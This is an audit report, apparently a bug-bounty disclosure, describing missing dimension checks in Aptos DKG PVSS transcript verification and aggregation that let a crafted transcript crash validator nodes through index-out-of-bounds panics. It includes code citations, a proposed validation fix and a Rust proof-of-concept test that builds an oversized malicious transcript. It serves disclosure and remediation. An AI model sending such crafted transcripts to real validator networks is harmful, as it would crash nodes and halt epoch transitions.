# Audit Report

## Title
Missing Dimensional Validation in DKG PVSS Chunked Values Causes Validator Node Crashes

## Summary
The `Witness` struct in `chunked_scalar_mul.rs` and related DKG structures lack dimensional validation for chunked values. A malicious node can send a DKG transcript with oversized chunk arrays, causing index-out-of-bounds panics during verification and aggregation, leading to validator node crashes and DKG protocol disruption.

## Finding Description

The DKG (Distributed Key Generation) protocol uses chunked scalar multiplication for PVSS (Publicly Verifiable Secret Sharing). The `Witness` struct contains a 3-dimensional array `chunked_values: Vec<Vec<Vec<Scalar<F>>>>` without any bounds validation on the innermost vector dimensions. [1](#0-0) 

This structure flows through the cryptographic pipeline and becomes part of `Subtranscript.Cs` which can be deserialized from network data without validation: [2](#0-1) 

The verification logic checks that the number of players matches but never validates chunk counts: [3](#0-2) 

During verification, the code performs indexed access to `pp.powers_of_radix[j]` without bounds checking: [4](#0-3) 

The `powers_of_radix` array has a fixed size based on `num_chunks_per_scalar(ell)`: [5](#0-4) 

**Attack Path:**
1. Malicious node creates a `Subtranscript` with `Cs[i][j].len() > num_chunks_per_scalar(ell)`
2. Serializes and broadcasts this transcript to honest validators
3. Honest validators deserialize the transcript (no validation occurs)
4. During `verify()`, the loop iterates `j` from 0 to `Cs_flat[i].len()`
5. When `j >= powers_of_radix.len()`, the access `pp.powers_of_radix[j]` panics
6. Validator node crashes with index out of bounds error

Additionally, the aggregation function uses nested indexed access without validation: [6](#0-5) 

If two transcripts have mismatched chunk dimensions, aggregation will panic.

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria:
- **Validator node crashes**: Direct DoS attack causing validator nodes to panic and crash
- **DKG protocol disruption**: If sufficient validators crash, the DKG ceremony cannot complete
- **Epoch transition failure**: DKG is critical for epoch transitions; failures could halt network progress

The vulnerability enables a Byzantine node to crash honest validators during critical DKG operations, potentially preventing the network from transitioning epochs and selecting new validator sets. This affects network availability and liveness.

## Likelihood Explanation

**Likelihood: HIGH**

- No authentication required beyond being a network participant
- Trivial to exploit: craft a transcript with extra chunks
- Affects all validators simultaneously when they receive the malicious transcript
- No rate limiting or input validation prevents the attack
- Critical path executed during DKG ceremony (not optional functionality)

The attack is practical and requires minimal sophistication. Any node participating in DKG can trigger the vulnerability by sending a specially-crafted transcript.

## Recommendation

Add dimensional validation when deserializing and processing DKG transcripts:

```rust
// In Subtranscript validation (weighted_transcript.rs verify function)
let expected_chunks = num_chunks_per_scalar::<E::ScalarField>(pp.ell) as usize;

for (player_id, Cs_player) in self.subtrs.Cs.iter().enumerate() {
    let weight = sc.get_player_weight(&sc.get_player(player_id));
    if Cs_player.len() != weight {
        bail!(
            "Player {} has {} chunk arrays but weight is {}",
            player_id,
            Cs_player.len(),
            weight
        );
    }
    
    for (weight_idx, chunks) in Cs_player.iter().enumerate() {
        if chunks.len() != expected_chunks {
            bail!(
                "Player {} weight {} has {} chunks but expected {}",
                player_id,
                weight_idx,
                chunks.len(),
                expected_chunks
            );
        }
    }
}

// Validate Rs dimensions
for (idx, R_vec) in self.subtrs.Rs.iter().enumerate() {
    if R_vec.len() != expected_chunks {
        bail!(
            "Rs[{}] has {} elements but expected {}",
            idx,
            R_vec.len(),
            expected_chunks
        );
    }
}
```

Additionally, add validation in the `Witness` struct initialization to enforce dimensional consistency at construction time.

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_test {
    use super::*;
    use ark_bls12_381::Bls12_381 as E;
    use aptos_crypto::weighted_config::WeightedConfigArkworks;
    
    #[test]
    #[should_panic(expected = "index out of bounds")]
    fn test_oversized_chunks_cause_panic() {
        let sc = WeightedConfigArkworks::<Fr>::new(2, vec![1, 1]).unwrap();
        let pp = PublicParameters::<E>::default();
        let ell = pp.ell;
        let expected_chunks = num_chunks_per_scalar::<Fr>(ell) as usize;
        
        // Create malicious transcript with EXTRA chunks
        let malicious_chunks_per_player = expected_chunks + 5; // Oversized!
        
        let mut malicious_transcript = Transcript::<E>::generate(&sc, &pp, &mut thread_rng());
        
        // Replace Cs with oversized chunk arrays
        malicious_transcript.subtrs.Cs = (0..sc.get_total_num_players())
            .map(|i| {
                let w = sc.get_player_weight(&sc.get_player(i));
                (0..w)
                    .map(|_| unsafe_random_points_group(malicious_chunks_per_player, &mut thread_rng()))
                    .collect()
            })
            .collect();
        
        // Also need to resize Rs to match (or it will panic earlier)
        malicious_transcript.subtrs.Rs = (0..sc.get_max_weight())
            .map(|_| unsafe_random_points_group(malicious_chunks_per_player, &mut thread_rng()))
            .collect();
        
        // Serialize and deserialize to simulate network transmission
        let bytes = malicious_transcript.to_bytes();
        let deserialized = Transcript::<E>::try_from(bytes.as_slice()).unwrap();
        
        // Create dummy keys for verification
        let eks: Vec<_> = (0..sc.get_total_num_players())
            .map(|_| keys::EncryptPubKey { ek: unsafe_random_point_group(&mut thread_rng()) })
            .collect();
        let spks: Vec<_> = (0..sc.get_total_num_players())
            .map(|_| bls12381::PrivateKey::generate_for_testing().public_key())
            .collect();
        
        // This will panic with index out of bounds when accessing pp.powers_of_radix[j]
        // where j >= expected_chunks
        deserialized.verify(&sc, &pp, &spks, &eks, &"test_session").unwrap();
    }
}
```

This PoC demonstrates that a transcript with oversized chunk arrays will cause a panic during verification, crashing the validator node.

## Notes

This vulnerability is particularly dangerous because:
1. It affects a critical consensus-related component (DKG for validator set updates)
2. The panic occurs during verification, not just aggregation
3. Multiple attack vectors exist (verification and aggregation paths)
4. No recovery mechanism exists - the node simply crashes

The fix must be applied before production DKG ceremonies to prevent network disruption during epoch transitions.

### Citations

**File:** crates/aptos-dkg/src/pvss/chunky/chunked_scalar_mul.rs (L73-78)
```rust
#[derive(
    SigmaProtocolWitness, CanonicalSerialize, CanonicalDeserialize, Clone, Debug, PartialEq, Eq,
)]
pub struct Witness<F: PrimeField> {
    pub chunked_values: Vec<Vec<Vec<Scalar<F>>>>,
}
```

**File:** crates/aptos-dkg/src/pvss/chunky/weighted_transcript.rs (L102-109)
```rust
impl<E: Pairing> TryFrom<&[u8]> for Subtranscript<E> {
    type Error = CryptoMaterialError;

    fn try_from(bytes: &[u8]) -> Result<Self, Self::Error> {
        bcs::from_bytes::<Subtranscript<E>>(bytes)
            .map_err(|_| CryptoMaterialError::DeserializationError)
    }
}
```

**File:** crates/aptos-dkg/src/pvss/chunky/weighted_transcript.rs (L140-153)
```rust
        if self.subtrs.Cs.len() != sc.get_total_num_players() {
            bail!(
                "Expected {} arrays of chunked ciphertexts, but got {}",
                sc.get_total_num_players(),
                self.subtrs.Cs.len()
            );
        }
        if self.subtrs.Vs.len() != sc.get_total_num_players() {
            bail!(
                "Expected {} arrays of commitment elements, but got {}",
                sc.get_total_num_players(),
                self.subtrs.Vs.len()
            );
        }
```

**File:** crates/aptos-dkg/src/pvss/chunky/weighted_transcript.rs (L255-261)
```rust
        for i in 0..Cs_flat.len() {
            for j in 0..Cs_flat[i].len() {
                let base = Cs_flat[i][j];
                let exp = pp.powers_of_radix[j] * powers_of_beta[i];
                base_vec.push(base);
                exp_vec.push(exp);
            }
```

**File:** crates/aptos-dkg/src/pvss/chunky/weighted_transcript.rs (L397-406)
```rust
        for i in 0..sc.get_total_num_players() {
            for j in 0..self.Vs[i].len() {
                // Aggregate the V_{i,j}s
                self.Vs[i][j] += other.Vs[i][j];
                for k in 0..self.Cs[i][j].len() {
                    // Aggregate the C_{i,j,k}s
                    self.Cs[i][j][k] += other.Cs[i][j][k];
                }
            }
        }
```

**File:** crates/aptos-dkg/src/pvss/chunky/public_parameters.rs (L35-40)
```rust
fn compute_powers_of_radix<E: Pairing>(ell: u8) -> Vec<E::ScalarField> {
    utils::powers(
        E::ScalarField::from(1u64 << ell),
        num_chunks_per_scalar::<E::ScalarField>(ell) as usize,
    )
}
```
